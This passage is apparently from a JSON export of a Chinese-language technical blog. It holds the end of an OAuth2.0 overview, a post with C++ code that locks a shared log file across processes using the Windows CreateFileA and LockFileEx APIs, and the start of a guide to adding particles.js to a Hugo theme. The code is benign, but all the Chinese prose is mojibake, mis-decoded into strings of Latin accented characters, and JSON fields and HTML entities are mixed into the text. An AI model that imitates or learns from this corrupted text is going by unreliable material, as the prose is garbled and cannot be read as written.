ä¸ºæœ€åˆæœ‰ä¸€ä¸ª1.0åè®®ï¼Œä½†æ˜¯è¿™ä¸ª1.0åè®®å¤ªå¤æ‚ï¼Œæ˜“ç”¨æ€§å·®ï¼Œæ‰€ä»¥æ²¡æœ‰å¾—åˆ°æ™®åŠã€‚2.0æ˜¯ä¸€ä¸ªæ–°çš„è®¾è®¡ï¼Œä½†å®ƒå¹¶ä¸å…¼å®¹1.0ï¼Œå¯ä»¥è¯´ä¸1.0æ²¡ä»€ä¹ˆå…³ç³»ã€‚\næœ¬æ–‡ç®€è¦ä»‹ç»äº†OAuth2.0çš„å››ç§å·¥ä½œæ–¹å¼ï¼Œé€šè¿‡ç½‘æ˜“äº‘éŸ³ä¹å’ŒQQçš„è®¤è¯äº¤äº’ï¼Œå¸Œæœ›èƒ½ä½¿è¯»è€…å¯¹æ­¤æœ‰åˆæ­¥çš„è®¤è¯†ã€‚å…³äºå…·ä½“çš„äº¤äº’URLï¼Œæœ¬æ–‡æ²¡æœ‰ç»™å‡ºï¼Œå¯ä»¥å‚è€ƒæ–‡æœ«çš„ä¸€äº›åšå®¢ã€‚å…³äºé’ˆå¯¹OAuth2.0çš„ä¸€äº›æ”»å‡»æ‰‹æ®µï¼Œè¯·è§ä¸‹å›åˆ†è§£ã€‚\nå‚è€ƒèµ„æ–™ï¼š [1] çŸ³ç‘ç”Ÿï¼Œå´æ—­. å¤§æ•°æ®å®‰å…¨ä¸éšç§ä¿æŠ¤[M]. åŒ—äº¬ï¼šåŒ—äº¬é‚®ç”µå¤§å­¦å‡ºç‰ˆç¤¾ï¼Œ2019\n[2] åå…«å²çš„å¤å¤©. OAuth2.0çš„ç®€ä»‹. [EB/OL]. [2019-08-19]. https://www.cnblogs.com/xiaofengwang/p/11376881.html\n[3] é˜®ä¸€å³°. ç†è§£OAuth2.0. [EB/OL]. [2014-05-12]. http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html\n","date":"2020-10-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/oauth2.0%E6%B5%85%E6%9E%90/","title":"OAuth2.0æµ…æ"},{"content":"è¿™æ®µæœŸé—´æ²¡å­¦åˆ°ä»»ä½•å®Œæ•´çš„ã€å€¼å¾—è®°å½•çš„ä¸œè¥¿ï¼Œå› æ­¤å¥½ä¹…æ²¡æœ‰æ›´æ–°åšå®¢äº†ï¼Œå‡‘å·§ä¸­åˆä¸€è¾¹å–å¤§çº¢è¢ä¸€è¾¹æå‡ºäº†ä¸€ç‚¹ä¸œè¥¿ï¼Œè™½ç„¶ä¸å¤ªå®Œæ•´ï¼Œä¹Ÿä¸å¦¨ä¸€è®°ã€‚\næœ€è¿‘åœ¨æ£é¼“Windowsä¸‹åº”ç”¨ç¨‹åºè°ƒç”¨APIçš„æƒ…å†µç»Ÿè®¡ï¼Œæ€è·¯æ˜¯å‘æŒ‡å®šçš„è¿›ç¨‹ä¸­æ³¨å…¥DLLï¼Œé’©å–ç³»ç»ŸAPIï¼Œè¿™æ ·æ¯æ¬¡è¿›ç¨‹è°ƒç”¨APIçš„æ—¶å€™å…ˆæ‰§è¡Œæˆ‘ä»¬çš„è¯­å¥ï¼Œå‘ç»Ÿè®¡æ–‡ä»¶ä¸­å†™å…¥ä¸€æ¡è°ƒç”¨ä¿¡æ¯ã€‚\nç”±æ­¤ï¼Œå¼•å‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœæˆ‘ä»¬æ³¨å…¥äº†å¤šä¸ªè¿›ç¨‹ï¼Œè¿™äº›è¿›ç¨‹åŒæ—¶è°ƒç”¨ä¸€ä¸ªAPIçš„æ—¶å€™ï¼Œéƒ½è¦å¾€ç»Ÿè®¡æ–‡ä»¶ä¸­å†™ä¸€æ¡ä¿¡æ¯ï¼Œå¦‚ä½•ä¿æŒå®ƒä»¬çš„åŒæ­¥å‘¢ï¼Ÿ\nç­”æ¡ˆå°±æ˜¯æ–‡ä»¶é”ã€‚\né” äº’æ–¥é”æ˜¯æ“ä½œç³»ç»Ÿç”¨æ¥ä¿æŒè¿›ç¨‹é—´åŒæ­¥çš„ä¸€ä¸ªå…³é”®å·¥å…·ï¼Œå¤šä¸ªè¿›ç¨‹åŒæ—¶å¯¹ä¸€ä¸ªå¯¹è±¡æ‰§è¡Œæ“ä½œçš„æ—¶å€™ï¼Œè¦åˆ†æ¸…æ¥šå…ˆåé¡ºåºï¼Œå¦åˆ™å¯èƒ½äº§ç”Ÿæ··ä¹±ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªè¿›ç¨‹1è¦å‘ä¸€ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥1 ~ 100çš„æ•°ï¼Œè€Œè¿›ç¨‹2è¦å‘è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥101 ~ 200çš„æ•°ï¼Œæˆ‘ä»¬å¸Œæœ›è¿›ç¨‹1å†™å®Œä¹‹åå†è®©è¿›ç¨‹2å†™ï¼Œä½†æ˜¯ç³»ç»Ÿåœ¨æ‰§è¡Œè¿›ç¨‹è°ƒåº¦çš„æ—¶å€™ï¼Œæ˜¯å¯èƒ½åœ¨è¿›ç¨‹1å†™åˆ°ä¸€åŠçš„æ—¶å€™å°†å…¶æŒ‚èµ·ï¼Œè½¬è€Œå»æ‰§è¡Œå…¶ä»–è¿›ç¨‹çš„ã€‚æƒ³ä¸€æƒ³æœ‰æ²¡æœ‰å¯èƒ½å‡ºç°è¿™ç§æƒ…å†µï¼šè¿›ç¨‹1å†™åˆ°äº†50ï¼Œç³»ç»Ÿå°†å…¶æŒ‚èµ·ï¼Œå»æ‰§è¡Œå…¶ä»–è¿›ç¨‹ï¼Œå…¶ä»–è¿›ç¨‹æ‰§è¡Œå®Œä¹‹åï¼Œç³»ç»Ÿä¸æ‰§è¡Œè¿›ç¨‹1ï¼Œè€Œæ˜¯æ‰§è¡Œè¿›ç¨‹2ï¼Œäºæ˜¯æˆ‘ä»¬çš„æ–‡ä»¶ä¸­çš„æ•°å­—å°±å˜æˆäº†1,2\u0026hellip;50,101,102\u0026hellip;\næ˜¾ç„¶ï¼Œè¿™æ ·çš„æƒ…å†µæ˜¯å¯èƒ½å‡ºç°ä½†æ˜¯ç»å¯¹ä¸ç¬¦åˆéœ€æ±‚çš„ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•é¿å…å®ƒã€‚\näºæ˜¯æ“ä½œç³»ç»Ÿä¸ºæˆ‘ä»¬æä¾›äº†äº’æ–¥é”ï¼Œå³ä¸€ä¸ªè¿›ç¨‹å¯¹æŸä¸ªå¯¹è±¡æ‰§è¡Œæ“ä½œçš„æ—¶å€™ï¼Œå°†è¿™ä¸ªå¯¹è±¡é”å®šï¼Œè¿™æ—¶å…¶ä»–çš„è¿›ç¨‹å°±æ— æ³•å¯¹è¿™ä¸ªå¯¹è±¡æ‰§è¡Œæ“ä½œäº†ã€‚\næœ¬ç¯‡ä¸­çš„æ–‡ä»¶é”å…¶å®å°±æ˜¯ä½œç”¨åœ¨æ–‡ä»¶ä¸Šçš„äº’æ–¥é”ã€‚è¿˜æ˜¯åˆšæ‰çš„ä¾‹å­ï¼Œå¦‚æœè¿›ç¨‹1åœ¨ä¸€å¼€å§‹å°±ä¸ºæ–‡ä»¶ä¸Šäº†é”ï¼Œå½“å®ƒæ‰§è¡Œåˆ°ä¸€åŠè¢«æŒ‚èµ·çš„æ—¶å€™ï¼Œå³ä½¿ç³»ç»Ÿè½¬ä¸ºæ‰§è¡Œè¿›ç¨‹2ï¼Œæ­¤æ—¶è¿›ç¨‹2ä¹Ÿä¼šå› ä¸ºæ— æ³•è·å¾—æ–‡ä»¶é”è€Œè¢«é˜»å¡ï¼›ä»…å½“è¿›ç¨‹1å®Œæˆäº†å†™å…¥ï¼Œé‡Šæ”¾äº†æ–‡ä»¶é”ï¼Œè¿›ç¨‹2æ‰ä¼šè¢«å”¤é†’æ‰§è¡Œã€‚\nè¿™æ ·çš„å·¥ä½œæ¨¡å¼å¯ä¸æ­¢ç”¨æ¥ä¿æŒæ–‡ä»¶çš„è¯»å†™åŒæ­¥ï¼Œè¿˜å¯ä»¥è§£å†³ä¸€ç³»åˆ—çš„åŒæ­¥é—®é¢˜ã€‚é”çš„æ€æƒ³åœ¨æ“ä½œç³»ç»Ÿé¢†åŸŸæ˜¯éå¸¸é‡è¦çš„ï¼Œè¿™é‡Œçš„ä»‹ç»ä¸å¤Ÿå…¨é¢ï¼Œä¸»è¦ä¹Ÿæ˜¯ç”±äºç¬”è€…ç›®å‰çš„æ°´å¹³ä¸å¤Ÿï¼Œæœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªè¡Œæ·±å…¥äº†è§£ã€‚\nåˆ›å»ºæ–‡ä»¶ åˆæ­¥äº†è§£äº†æ–‡ä»¶é”çš„å«ä¹‰ä¹‹åï¼Œå°±è¦è¿›å…¥ç¼–ç å®è·µäº†ã€‚æœ¬ç¯‡åç»­ç¼–ç æ˜¯ä»¥C++ä¸ºä¸»ä½“ï¼Œä½†æ˜¯æ ¸å¿ƒéƒ¨åˆ†å®Œå…¨å…¼å®¹Cè¯­è¨€ã€‚\né¦–å…ˆè¦æ˜ç¡®ä¸€ç‚¹ï¼ŒC++çš„æ–‡ä»¶æµæ“ä½œæ— æ³•å®ç°æ–‡ä»¶é”ã€‚è¿™ä¸ªæ˜¯ç¬”è€…ç›®å‰çš„æ°´å¹³ä¸‹å¾—å‡ºçš„ç»“è®ºï¼Œæ¬¢è¿è§å¤šè¯†å¹¿çš„è¯»è€…åœ¨è¯„è®ºåŒºæ‰¹è¯„æŒ‡æ­£ã€‚\næ—¢ç„¶æ— æ³•ä½¿ç”¨fstreamå®ç°æ–‡ä»¶é”ï¼Œå°±å¿…é¡»è€è€å®å®ä½¿ç”¨Cè¯­è¨€çš„æ–‡ä»¶æ“ä½œäº†ã€‚\nåœ¨è¿™é‡Œï¼Œç”±äºWindowsAPIæä¾›çš„æ–‡ä»¶é”å‡½æ•°éœ€è¦ä¸€ä¸ªHANDLEç±»å‹ä½œä¸ºå‚æ•°ï¼Œæˆ‘ä»¬åªèƒ½ä½¿ç”¨CreateFileå‡½æ•°å»åˆ›å»ºæ–‡ä»¶äº†ã€‚\nè¯¥APIè¯¦è§æ­¤æ–‡æ¡£ã€‚\næˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹ä¸¤å¥è¯åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œæ–‡ä»¶è·¯å¾„å¯ä»¥è‡ªç”±å®šä¹‰ã€‚\nconst char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA( logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0 ); å€¼å¾—æ³¨æ„çš„æ˜¯CreateFileAçš„å‚æ•°OPEN_ALWAYSï¼Œè¯¥å‚æ•°æŒ‡å®šäº†æ–‡ä»¶çš„æ‰“å¼€æ–¹å¼ï¼šå½“æ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼Œåˆ›å»ºå®ƒï¼›å½“æ–‡ä»¶å­˜åœ¨æ—¶ï¼Œæ‰“å¼€å®ƒã€‚\næ–‡ä»¶ä¸Šé” æ–‡ä»¶åˆ›å»ºå®Œæˆä¹‹åï¼Œæ­£å¸¸çš„ä¸‹ä¸€æ­¥æ“ä½œåº”è¯¥æ˜¯å†™å…¥äº†ã€‚ä½†æ˜¯è°¨è®°ï¼Œä¸ºäº†ä¸å‘ç”Ÿå¼€å¤´æåˆ°çš„è¿›ç¨‹åŒæ­¥é—®é¢˜ï¼Œæˆ‘ä»¬è¦åœ¨å†™å…¥æ–‡ä»¶ä¹‹å‰å…ˆæ‹¿åˆ°æ–‡ä»¶çš„é”ã€‚è¿™é‡Œä½¿ç”¨Windowsæä¾›çš„ä¸€ä¸ªå…³é”®å‡½æ•°LockFileEx()ã€‚\nè¯¥APIè¯¦è§æ­¤æ–‡æ¡£\næˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‡ å¥è¯ä¸ºæ–‡ä»¶ä¸Šäº†ä¸ªé”ï¼Œè¿™é‡Œçš„overlappedå˜é‡æ˜¯APIè¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„ï¼Œæ²¡æœ‰å¾ˆå¤§çš„ç”¨å¤„ï¼Œå°†å…¶ç½®é›¶å³å¯ã€‚\nOVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000;\t// ä¸Šé”çš„å­—èŠ‚æ•°ï¼Œæ²¡æœ‰å¾ˆå¤§çš„æ„ä¹‰ï¼Œéé›¶å³å¯ã€‚ if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } å½“æ–‡ä»¶ä¸Šé”å¤±è´¥ï¼Œifåˆ¤æ–­ä¼šæˆç«‹ï¼Œè¿›å…¥é”™è¯¯å¤„ç†ç¯èŠ‚ã€‚è®°ä½å¼€å¤´æåˆ°çš„é”çš„æœºåˆ¶ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹æ— æ³•è·å–å½“å‰çš„æ–‡ä»¶é”çš„æ—¶å€™ï¼Œå®ƒåº”è¯¥æ˜¯ä¼šè¢«é˜»å¡è€Œéç›´æ¥æŠ¥é”™ã€‚åœ¨æˆ‘çš„è¯•éªŒä¸­ï¼Œè¿›å…¥è¿™ä¸ªåˆ†æ”¯çš„æƒ…å†µæ˜¯ç¬¬ä¸€æ­¥CreateFileçš„æ—¶å€™å¾—åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„å¥æŸ„ï¼Œè€Œéæ— æ³•è·å–å½“å‰æ–‡ä»¶çš„é”ã€‚\nLickFileEx()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ¯”è¾ƒå…³é”®ï¼Œå½“å®ƒè¢«æŒ‡å®šä¸ºLOCKFILE_FAIL_IMMEDIATELY çš„æ—¶å€™ä¼šç›´æ¥è¿”å›å¤±è´¥ï¼Œè€Œä¸æ˜¯é˜»å¡å½“å‰è¿›ç¨‹ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å½“ç„¶ä¸é€‰è¿™ä¸ªå‚æ•°ã€‚\næ–‡ä»¶ä¸Šé”æˆåŠŸä¹‹åï¼Œå°±å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„å†™å…¥äº†ã€‚\nelse { std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 1 locked the file. [+]\\n\u0026#34;; // å°†æ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°æ–‡ä»¶æœ«å°¾ï¼Œå®ç°ä»¥è¿½åŠ æ–¹å¼å†™å…¥ SetFilePointer(hFile, 0, NULL, FILE_END); ::WriteFile(hFile, str.c_str(), str.length(), 0, 0); getchar();\t// åœ¨æ­¤å¤„åœæ­¢ï¼Œå…ˆä¸é‡Šæ”¾æ–‡ä»¶é” UnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } å°†ä»¥ä¸Šçš„ä¸‰ä¸ªéƒ¨åˆ†ç»“åˆèµ·æ¥ï¼Œå°±æ˜¯ç¬¬ä¸€ä¸ªè¿›ç¨‹çš„ä»£ç ï¼š\nint main() { const char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA(logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0); OVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000; if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } else { std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 1 locked the file. [+]\\n\u0026#34;; // å°†æ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°æ–‡ä»¶æœ«å°¾ï¼Œå®ç°ä»¥è¿½åŠ æ–¹å¼å†™å…¥ SetFilePointer(hFile, 0, NULL, FILE_END); ::WriteFile(hFile, str.c_str(), str.length(), 0, 0); getchar();\t// åœ¨æ­¤å¤„åœæ­¢ï¼Œå…ˆä¸é‡Šæ”¾æ–‡ä»¶é” UnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } system(\u0026#34;pause\u0026#34;); return 0; } ç¬¬äºŒä¸ªè¿›ç¨‹ ç¬¬äºŒä¸ªè¿›ç¨‹è¢«æˆ‘ä»¬ç”¨æ¥éªŒè¯è¿™ä¸ªé”çš„å¯è¡Œæ€§ï¼Œå³å½“ç¬¬ä¸€ä¸ªè¿›ç¨‹ä¸ºæ–‡ä»¶ä¸Šäº†é”ï¼Œä¸”è¿˜æ²¡é‡Šæ”¾çš„æ—¶å€™ï¼Œç¬¬äºŒä¸ªè¿›ç¨‹ç©¶ç«Ÿèƒ½å¦å¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚\nint main() { const char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA(logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0); OVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000; if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } else { std::cout \u0026lt;\u0026lt; \u0026#34;Get lock.\\n\u0026#34;; std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 2 locked the file. [+]\\n\u0026#34;; SetFilePointer(hFile, 0, NULL, FILE_END);\t// å°†æ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°æ–‡ä»¶æœ«å°¾ï¼Œå®ç°ä»¥è¿½åŠ æ–¹å¼å†™å…¥ ::WriteFile(hFile, str.c_str(), str.length(), 0, 0); // getchar();\t// åœ¨æ­¤å¤„åœæ­¢ï¼Œå…ˆä¸é‡Šæ”¾æ–‡ä»¶é” UnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } system(\u0026#34;pause\u0026#34;); return 0; } éªŒè¯ é¦–å…ˆè¿è¡Œç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒå°†åœ¨getchar()å‡½æ•°éƒ¨åˆ†åœæ­¢ï¼Œæ­¤æ—¶è¿˜æ²¡æœ‰é‡Šæ”¾æ–‡ä»¶é”ï¼› è½¬ä¸ºè¿è¡Œç¬¬äºŒä¸ªè¿›ç¨‹ï¼Œæ­¤æ—¶å®ƒæ— æ³•å¯¹æ–‡ä»¶è¿›è¡Œä¸Šé”æ“ä½œï¼› åœ¨ç¬¬ä¸€ä¸ªè¿›ç¨‹çª—å£æŒ‰ä¸‹ä»»æ„é”®ï¼Œå®ƒå°†é‡Šæ”¾æ–‡ä»¶é”ï¼Œå¹¶å…³é—­æ–‡ä»¶å¥æŸ„ï¼› è§‚å¯Ÿç¬¬äºŒä¸ªè¿›ç¨‹è¾“å‡ºï¼Œå‘ç°å®ƒå·²ç»å¾—åˆ°æ–‡ä»¶é”ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­å†™å…¥äº†å¯¹åº”ä¿¡æ¯ã€‚ å…ˆåæ‰“å¼€ä¸¤ä¸ªè¿›ç¨‹ ç¬¬ä¸€ä¸ªè¿›ç¨‹é‡Šæ”¾é” æ–‡ä»¶å†…å®¹å®ç°åŒæ­¥ ","date":"2020-09-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E6%96%87%E4%BB%B6%E5%90%8C%E6%AD%A5%E5%86%99/","title":"è¿›ç¨‹é—´æ–‡ä»¶åŒæ­¥å†™"},{"content":"åˆç”Ÿçš„åšå®¢ï¼Œæ›´æ–°å°±æ˜¯é¢‘ç¹ã€‚\nå¦‚æœä½ çœ‹åˆ°è¿™ç¯‡åšæ–‡ï¼Œåº”è¯¥èƒ½æ³¨æ„åˆ°è¿™ç¯‡åšæ–‡çš„èƒŒæ™¯æœ‰äº†ä¸€ç‚¹å°å˜åŒ–ã€‚\næ²¡é”™ï¼Œåœ¨è¿™ç¯‡æ–‡ç« é‡Œï¼Œæˆ‘è¦è®°å½•ä¸€æ¬¾å¼ºå¤§çš„JSæ’ä»¶particles.jsçš„ä½¿ç”¨æ–¹æ³•ï¼Œè¿™æ¬¾åº”ç”¨èƒ½è®©ä½ çš„ç½‘é¡µèƒŒæ™¯çœ‹èµ·æ¥ä¸é‚£ä¹ˆå•è°ƒï¼ˆç®€ç›´éå¸¸é€‚åˆæˆ‘ç°åœ¨çš„åšå®¢ä¸»é¢˜ï¼‰ã€‚\nä½ å¯ä»¥åœ¨ä¸‹é¢è¿™ä¸ªé“¾æ¥æ‰¾åˆ°è¿™æ¬¾åº”ç”¨çš„æºç ï¼Œè™½ç„¶æˆ‘æˆåŠŸä½¿ç”¨è¿™æ¬¾æ’ä»¶çš„å†ç¨‹æ¯”è¾ƒè‰°è¾›ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯éå¸¸æ•¬ä½©èƒ½å†™å‡ºè¿™ç§ä»£ç çš„äººã€‚\n(https://github.com/VincentGarreau/particles.js)\nè¯ä¸å¤šè¯´ï¼Œlet\u0026rsquo;s go!\nä¸‹è½½è¿™æ¬¾æ’ä»¶ ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨git cloneæˆ–è€…ä»ç½‘é¡µä¸Šä¸‹è½½å®ƒã€‚\nè§£å‹å®Œæˆä¹‹åï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªDemoæ–‡ä»¶å¤¹ï¼Œä¸å¦¨å…ˆè¿›å»çœ‹çœ‹æ­£ç¡®ä½¿ç”¨è¿™æ¬¾åº”ç”¨çš„æ—¶å€™èƒ½äº§ç”Ÿä»€ä¹ˆæ•ˆæœã€‚\nåœ¨æºç ä¸­ä¸ºæ’ä»¶ç•™å‡ºä½ç½® åœ¨æ’ä»¶ä½œè€…çš„GitHubä»“åº“é‡Œå®é™…ä¸Šå·²ç»å†™æ˜äº†ä½¿ç”¨æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘è¦ç»“åˆhugoå’Œæˆ‘çš„ä¸»é¢˜â€”â€”Keepitâ€”â€”å†è¯¦ç»†åœ°ä»‹ç»ä¸€æ¬¡ã€‚\nåœ¨ä½ çš„é¡µé¢ä¸­ä¸ºæ’ä»¶ç•™å‡ºä½ç½®ï¼Œè¿™ä¸ªæ“ä½œéå¸¸ç®€å•ã€‚æ‰“å¼€ä½ çš„footer.htmlï¼Œæ‰¾ä¸€ä¸ªåˆé€‚çš„ä½ç½®ï¼ˆæœ€å¥½æ˜¯æœ€å¤–å±‚ï¼‰ï¼ŒåŠ ä¸Šä¸€ä¸ªæ ‡ç­¾ï¼š\n\u0026lt;div id=\u0026quot;particles-js\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\nç„¶åï¼Œå°±æ²¡æœ‰ç„¶åäº†ï¼ç°åœ¨ä½ çš„æ’ä»¶å·²ç»èƒ½å¤Ÿæ‰¾åˆ°å®ƒçš„å®¹èº«ä¹‹æ‰€äº†ï¼Œå‡†å¤‡è®©å®ƒè¿è¡Œèµ·æ¥å§ï¼\np.s footer.htmlåœ¨æ–‡ä»¶å¤¹partialsé‡Œï¼Œçœ‹è¿‡ç¬¬ä¸€ç¯‡åšæ–‡çš„ä½ ï¼Œåº”è¯¥å¾ˆç†Ÿæ‚‰å®ƒçš„å†…å®¹äº†å§ï¼Ÿå…³äºæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦åœ¨è¿™ä¸ªæ–‡ä»¶é‡ŒåŠ ä¸Šè¿™ä¸ªä¸œè¥¿ï¼Œä¸»è¦æ˜¯è€ƒè™‘åˆ°ä»»ä½•ç•Œé¢éƒ½æœ‰è¿™ä¹ˆä¸€ä¸ªç‰ˆæƒè¯´æ˜æ¨¡å—ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯ä»»ä½•ç•Œé¢åˆ°æ—¶å€™éƒ½ä¼šæœ‰æ¼‚æ¼‚äº®äº®çš„èƒŒæ™¯ï¼è¿˜æœ‰ï¼Œæˆ‘è®¤ä¸ºå¯èƒ½å­˜åœ¨æŸäº›ä¸»é¢˜æ²¡æœ‰footer.htmlæ–‡ä»¶ï¼Œä½†æ˜¯è¿™æ ¹æœ¬æ²¡ä»€ä¹ˆå…³ç³»ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠè¿™ä¸ªdivåŠ åœ¨ä»»ä½•ä½ æƒ³è¦çš„çš„åœ°æ–¹ã€‚\np.p.s 2021å¹´1æœˆ14æ—¥ï¼Œç°åœ¨æˆ‘æŠŠè¿™éƒ¨åˆ†ä»£ç åŠ åœ¨äº†layouts/_default/baseof.htmlï¼Œå› ä¸ºå®ƒä¼¼ä¹æ˜¯æ‰€æœ‰é¡µé¢çš„åŸºæœ¬æ¡†æ¶ï¼Œé€‚ç”¨æ€§æ›´å¼ºä¸€äº›ã€‚\nå¼•å…¥æ’ä»¶ ä½ å¯èƒ½ä¼šè®¤ä¸ºï¼Œè¿™ç¯‡åšæ–‡çš„ç¬¬äºŒæ­¥å’Œç¬¬ä¸‰æ­¥å®Œå…¨å¯ä»¥è°ƒæ¢é¡ºåºï¼Œå¦‚æœä½ è¿™ä¹ˆæƒ³äº†ï¼Œä¹Ÿè¿™ä¹ˆåšäº†ï¼Œé‚£æˆ‘ç¥ä½ ä¸è¦è¸©åˆ°æˆ‘è¸©è¿‡çš„å‘ã€‚\næˆ‘ä»¬è¦åœ¨ç¬¬äºŒæ­¥çš„divåº•ä¸‹å†™å…¥æ’ä»¶ã€‚\nä¸ºä»€ä¹ˆè¿™æ ·ï¼Ÿå› ä¸ºJavaScriptçš„åŠ è½½é¡ºåºæ˜¯ä»å‰å¾€åçš„ã€‚æœ‰è¿‡Bootstrapæ¡†æ¶ä½¿ç”¨ç»éªŒçš„æœ‹å‹åº”è¯¥çŸ¥é“ï¼Œåœ¨ä½¿ç”¨Bootstrapçš„JSåº”ç”¨æ—¶ï¼Œè¦åœ¨ä¹‹å‰é¦–å…ˆå¼•å…¥jQueryï¼Œå¦åˆ™æ•´ä¸ªé¡µé¢å°†æ— æ³•å®ç°åº”æœ‰çš„åŠŸèƒ½ï¼\næˆ‘ä»¬çš„é¡ºåºä¹Ÿæ˜¯å¦‚æ­¤ã€‚åœ¨æˆ‘ä½¿ç”¨è¿™ä¸ªæ’ä»¶çš„æ—¶å€™ï¼Œå°è¯•è¿‡è¿‡å‡ ç§æ–¹æ³•ï¼šåœ¨/asset/jsæ–‡ä»¶å¤¹ä¸­æ”¾å…¥ç›¸åº”çš„JSæ–‡ä»¶ï¼›åœ¨partialsæ–‡ä»¶å¤¹ä¸­å†™ä¸€ä¸ªcustom_js.htmlæ–‡ä»¶ï¼Œé‡Œé¢æ˜¯å‡ æ¡ç®€å•çš„\u0026lt;script\u0026gt;æ ‡ç­¾ï¼›ä¿®æ”¹partialsæ–‡ä»¶å¤¹ä¸­çš„head.htmlæ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨å°±å¼•å…¥æ’ä»¶ï¼›åœ¨ç¬¬äºŒæ­¥çš„\u0026lt;div\u0026gt;ä¹‹å‰å†™å…¥å‡ æ¡\u0026lt;script\u0026gt;æ ‡ç­¾ã€‚\nä»¥ä¸Šæ–¹æ³•å…¨éƒ¨å¤±è´¥ã€‚\nå› æ­¤ï¼Œä½ ä¸è¦å°çœ‹è¿™ç¯‡åšæ–‡çš„åˆ†é‡ï¼Œå®ƒå¯èƒ½å¯ä»¥å¸®åŠ©ä½ èŠ‚çœå‡ ä¸ªå°æ—¶çš„è¯•é”™æ—¶é—´ã€‚\nè¨€å½’æ­£ä¼ ï¼Œæˆ‘ä»¬è¿˜æ˜¯éœ€è¦æŠŠæ’ä»¶çš„JSæ–‡ä»¶å¼•å…¥åˆ°æºç ä¸­ã€‚è¦æƒ³æ’ä»¶èƒ½å¤Ÿå·¥ä½œï¼Œä½ åªéœ€è¦ä½¿ç”¨ä¸¤ä¸ªæ–‡ä»¶ï¼šparticles.jså’Œapp.jsï¼Œä»–ä»¬åˆ†åˆ«åœ¨ç¬¬ä¸€æ­¥é‚£ä¸ªé¡¹ç›®çš„æ ¹ç›®å½•é‡Œï¼Œè¿˜æœ‰Demoæ–‡ä»¶å¤¹é‡Œã€‚particles.jsæ˜¯å‘æŒ¥åŠŸèƒ½çš„æ–‡ä»¶ï¼Œè€Œapp.jsæ˜¯é…ç½®æ–‡ä»¶ï¼Œå…·ä½“èƒ½é…ç½®äº›ä»€ä¹ˆï¼Œåé¢å†è¯´ï¼Œæ€»ä¹‹ï¼Œå…ˆä½¿ç”¨åˆ«äººå¸®ä½ 